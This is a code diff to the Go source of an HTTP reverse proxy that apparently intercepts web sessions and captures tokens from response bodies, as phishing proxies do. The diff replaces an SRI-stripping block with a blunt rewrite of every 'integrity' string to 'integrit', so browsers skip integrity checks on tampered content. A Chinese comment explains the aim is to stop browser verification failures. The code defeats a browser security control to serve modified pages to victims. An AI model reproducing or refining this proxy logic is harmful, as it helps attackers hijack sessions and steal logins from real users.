@@ -1022,6 +1022,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
 
+			re := regexp.MustCompile(`integrity`)
+			body = []byte(re.ReplaceAllString(string(body), "integrit"))
+
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					// capture body response tokens
@@ -1165,18 +1168,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 						}
-						
+
 						body = []byte(removeObfuscatedDots(string(body)))
 					}
 				}
 
-				// 删除 SRI integrity 属性，防止浏览器校验失败（必须在所有处理之后）
-				if stringExists(mime, p.auto_filter_mimes) {
-					re_integrity := regexp.MustCompile(`\s+integrity\s*=\s*["'][^"']*["']`)
-					body = []byte(re_integrity.ReplaceAllString(string(body), ""))
-					re_integrity2 := regexp.MustCompile(`\s+integrity\s*=\s*\S+`)
-					body = []byte(re_integrity2.ReplaceAllString(string(body), ""))
-				}
+				//// 删除 SRI integrity 属性，防止浏览器校验失败（必须在所有处理之后）
+				//if stringExists(mime, p.auto_filter_mimes) {
+				//	re_integrity := regexp.MustCompile(`\s+integrity\s*=\s*["'][^"']*["']`)
+				//	body = []byte(re_integrity.ReplaceAllString(string(body), ""))
+				//	re_integrity2 := regexp.MustCompile(`\s+integrity\s*=\s*\S+`)
+				//	body = []byte(re_integrity2.ReplaceAllString(string(body), ""))
+				//}
 
 				if stringExists(mime, []string{"text/html"}) {
 
